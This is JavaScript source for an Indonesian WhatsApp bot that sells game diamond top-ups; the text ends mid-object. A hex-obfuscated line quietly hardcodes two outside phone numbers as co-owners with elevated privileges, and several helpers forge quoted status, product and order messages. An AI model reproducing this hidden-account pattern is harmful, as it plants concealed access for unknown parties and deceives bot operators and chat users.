
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const util = require('util')
const crypto = require('crypto')  
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const _Elite = JSON.parse(fs.readFileSync('./alpha/Elite.json')) 

shop = 'OCHOBOTZ' 
thumbnail = setting.thumb
fthumb = setting.fakethumb
hit_today = []
blocked = []

let multi = true
let nopref = false
let single = false
let prefa = setting.prefix

banChats = false
offline = false

var nomor_dana = `Gopay Only \n` 
var nomor_gopay = `Pakai Qr code\n A.N OCHOBOTZ` 
var nomor_ovo = `Gopay Only\n` 
var nomor_linkaja = `Gopay Only\n` 

var qr_code_dana = 'https://g.top4top.io/p_2143we1fx0.jpg' 
var qr_code_gopay = 'https://g.top4top.io/p_2143we1fx0.jpg' 
var qr_code_ovo = 'https://g.top4top.io/p_2143we1fx0.jpg'
var qr_code_linkaja = 'https://g.top4top.io/p_2143we1fx0.jpg'

// list diamond                                            // harga diamond
let _diamond1 = '⦿ 5 💎';           let diamond1 = 'Rp 830 💰';
let _diamond2 = '⦿ 20 💎';           let diamond2 = 'Rp 3.000💰';
let _diamond3 = '⦿ 50 💎';           let diamond3 = 'Rp 7.000💰';
let _diamond4 = '⦿ 70 💎';           let diamond4 = 'Rp 9.500💰';
let _diamond5 = '⦿ 100 💎';           let diamond5 = 'Rp 14.000💰';
let _diamond6 = '⦿ 150 💎';           let diamond6 = 'Rp 23.000💰';
let _diamond7 = '⦿ 210 💎';           let diamond7 = 'Rp 28.800💰';
let _diamond8 = '⦿ 355 💎';           let diamond8 = 'Rp 47.000💰';
let _diamond9 = '⦿ 500 💎';         let diamond9 = 'Rp 67.000💰';
let _diamond10 = '⦿ 720 💎';         let diamond10 = 'Rp 92.000💰';
let _diamond11 = '⦿ 1000 💎';         let diamond11 = 'Rp 130.000💰';
let _diamond12 = '⦿ 1075 💎';         let diamond12 = 'Rp 140.000💰';
let _diamond13  = '⦿ 1440 💎';         let diamond13 = 'Rp 200.000💰';
let _diamond14 = '⦿ 2000 💎';         let diamond14 = 'Rp 260.000💰';
let _diamond15 = '⦿ 5000 💎';         let diamond15 = 'Rp 520.000💰'; 
let _diamond16 = '⦿ M. Mingguan';       let diamond16 = 'Rp 28.800💰';
let _diamond17 = '⦿ M. Bulanan';      let diamond17 = 'Rp 140.000💰';

img = setting.img
baper = 'OCHOBOTZ' 
apiku = 'https://youtu.be.com'
targetpc = setting.ownerNumber
owner = setting.ownerNumber
fake = setting.fake
numbernye = '0'
waktu = '-'
alasan = '-'
botname = setting.botname
ownername = setting.ownername
cr = setting.cr
petik = '```'
enter = '\n'
msgId="B826873620DD5947E683E3ABE663F263"
//=================================================//
module.exports = alpha = async (alpha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
        const scommand = JSON.parse(fs.readFileSync('./lib/scommand.json'))
            const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./lib/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            status = true
        }
    })
    return status
}
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        if(multi){
		var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~xzZ+×_*!#,|`÷?;:%^&./\\©^]/gi) : '-'	  
		} else {
		if (nopref){
		prefix = ''
		} else {
		if(single){
		prefix = prefa
		}
		}
		}
        body = type === "conversation" && mek.message.conversation.startsWith(prefix) ? mek.message.conversation : type == "imageMessage" && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : type == "videoMessage" && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : type == "extendedTextMessage" && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : type == "stickerMessage" && getCmd(mek.message[type].fileSha256.toString("base64")) !== null && getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined ? getCmd(mek.message[type].fileSha256.toString("base64")) : "";
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
                chatxs = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'documentMessage') && mek.message.documentMessage.caption ? mek.message.documentMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ""
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        hit_today.push(command)		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? alpha.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const Ownerr = [`${targetpc}@s.whatsapp.net`]
		const isOwner = Ownerr.includes(sender)
		var _0xa1c8=["\x36\x32\x38\x38\x37\x34\x33\x35\x30\x34\x37\x33\x32\x36\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x39\x31\x39\x30\x34\x38\x34\x31\x36\x34\x30\x35\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73"];let alphaNumber=[_0xa1c8[0],_0xa1c8[1]];const isCoOwner=alphaNumber[_0xa1c8[2]](sender)
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await alpha.chats.all()
		const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const ratee = ["106","106","106","106","106","106","106"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
        const srchh = rateee[Math.floor(Math.random() * rateee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "Time" + " : " + jam + ":" + menit + ":" + detik;   
            var ase = new Date();
            var waktoo = ase.getHours();
            switch(waktoo){
                case 0: waktoo = "Selamat Malam 🌚"; break;
                case 1: waktoo = "Selamat Malam 🌚"; break;
                case 2: waktoo = "Selamat Malam 🌚"; break;
                case 3: waktoo = "Selamat Malam 🌚"; break;
                case 4: waktoo = "Selamat Pagi 🌞"; break;
                case 5: waktoo = "Selamat Pagi 🌞"; break;
                case 6: waktoo = "Selamat Pagi 🌞"; break;
                case 7: waktoo = "Selamat Pagi 🌞"; break;
                case 8: waktoo = "Selamat Pagi 🌞"; break;
                case 9: waktoo = "Selamat Pagi 🌞"; break;
                case 10: waktoo = "Selamat Pagi 🌞"; break;
                case 11: waktoo = "Waktu Dzuhur , jangan lupa shalat"; break;
                case 12: waktoo = "Selamat Siang ☀️"; break;
                case 13: waktoo = "Selamat Siang ☀️"; break;
                case 14: waktoo = "Waktu Ashar , jangan lupa shalat"; break;
                case 15: waktoo = "Selamat Sore 🌌"; break;
                case 16: waktoo = "Selamat Sore 🌌"; break;
                case 17: waktoo = "Selamat Sore 🌌"; break;
                case 18: waktoo = "Waktu Magrib, jangan lupa shalat"; break;
                case 19: waktoo = "Waktu Isya, jangan lupa shalat"; break;
                case 20: waktoo = "Selamat Malam 🌃"; break;
                case 21: waktoo = "Selamat Malam 🌃"; break;
                case 22: waktoo = "Selamat Malam 🌃"; break;
                case 23: waktoo = "Selamat Malam 🌃"; break;
            }
            var hahh = "" + waktoo;      
            var ase = new Date();
                        var waktoonyabro = ase.getHours();
                        switch(waktoonyabro){
                case 0: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 1: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 2: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 3: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 4: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 5: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 6: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 7: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 8: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 9: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 10: waktoonyabro = `Selamat Pagi ✨ ${pushname}`; break;
                case 11: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 12: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 13: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 14: waktoonyabro = `Selamat Siang 🔥 ${pushname}`; break;
                case 15: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 16: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 17: waktoonyabro = `Selamat Sore 🌹${pushname}`; break;
                case 18: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 19: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 20: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 21: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 22: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
                case 23: waktoonyabro = `Selamat Malam 🌛 ${pushname}`; break;
            }
            var ucapannya = "" + waktoonyabro;         
		mess = {
			wait: 'BENTAR',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'Itu bukan stiker',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Only Group',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
             alpha.sendMessage(from, teks, text,{
        thumbnail: fs.readFileSync(`image/${thumbnail}`),
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "externalAdReply": {
                "title": `${ucapannya}`,
                "body": `${shop}`,
                "previewType": "PHOTO",
                "thumbnailUrl": ``,
                "thumbnail": fs.readFileSync(`image/${thumbnail}`),
                "sourceUrl": `${apiku}`
            }},
			quoted: mek
			})
}  
        const sendText = async (txt) => {
            return alpha.sendText(from, txt)
                .catch(e => {
                    console.log(e)
                })
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }

        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${tee}.jpg`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`image/${thumbnail}`) //Gambarnye
					},
					"title": `${shop}`, 
					"description": "SELF BOT", 
					"currencyCode": "USD",
					"priceAmount1000": "1919199191",
					"retailerId": `${shop}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `62887435047326@s.whatsapp.net`
		}
	}
}
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `${shop}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fkontak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}       
             
        const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumbnail}`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
           cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
          }
        }
            }
          }
        }
      }
    }
    if (isGroup && !mek.key.fromMe && isAntiLink && !isGroupAdmins && !isOwner && !isCoOwner && isBotGroupAdmins){
            if (chatxs.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply(`「 G R O U P  L I N K  D E T E C T O R 」\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                alpha.groupRemove(from, [sender])
            }
        }
        const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      alpha.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };


//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      await alpha.updatePresence(from, Presence.recording)
      await alpha.updatePresence(from, Presence.composing)
		if (!mek.key.fromMe && !isOwner && !isCoOwner && banChats === true) return
		sub_yt_zeeone_ofc = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
        subscribezeeoneofc = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''
if(subscribezeeoneofc == 'diamond_ff'){
	const rows6 = [ {
				"title": `${_diamond1}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond2}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond3}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond4}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond5}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond6}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond7}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond8}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond9}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond10}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond11}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond12}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond13}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond14}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond15}`,
				"rowId": "0"
			}

]
		
	const sections6 = [{title: "Pilih salah satu", rows: rows6}]
const listt6 = {
 buttonText: 'SELECT HERE',
 title: `LIST DIAMOND`,
 description: `Hai @${sender.split('@')[0]} Have a nice day  😇 berikut list diamond yang tersedia`,
 footerText: `${tampilTanggal}${enter}${tampilWaktu}`,
 sections: sections6,
 listType: 1
}

alpha.sendMessage(from, listt6, MessageType.listMessage,{quoted:ftoko, contextInfo: { "mentionedJid" : [sender]}})
	}
if(subscribezeeoneofc == 'diamond_ffff'){
	const rows0 = [{
				"title": `${_diamond16}`,
				"rowId": "0"
			},
			{
				"title": `${_diamond17}`,
				"rowId": "0"
			}

]
		
	const sections0 = [{title: "Pilih salah satu", rows: rows0}]
const listt0 = {
 buttonText: 'SELECT HERE',
 title: `MEMBERLIST`,
 description: `Hai @${sender.split('@')[0]} Have a nice day  😇 berikut list diamond ff memberlist`,
 footerText: `${tampilTanggal}${enter}${tampilWaktu}`,
 sections: sections0,
 listType: 1
}

alpha.sendMessage(from, listt0, MessageType.listMessage,{quoted:ftoko, contextInfo: { "mentionedJid" : [sender]}})
	}
if(subscribezeeoneofc == 'diamond_ml'){
	const rows7 = [ {
				"title": `⦿ 86 💎 = Rp 22.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 172 💎 = Rp 41.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 257 💎 = Rp 62.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 706 💎 = Rp 162.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 2195 💎 = Rp 480.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 3688 💎 = Rp 780.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 5532 💎 = Rp 1.200.000 💰`,
				"rowId": "0"
			},
			{
				"title": `⦿ 9288 💎 = Rp 1.995.000 💰`,
				"rowId": "0"
			}

]
		
const sections7 = [{title: "Pilih salah satu", rows: rows7}]
const listt7 = {
 buttonText: 'SELECT HERE',
 title: `LIST DIAMOND ML`,
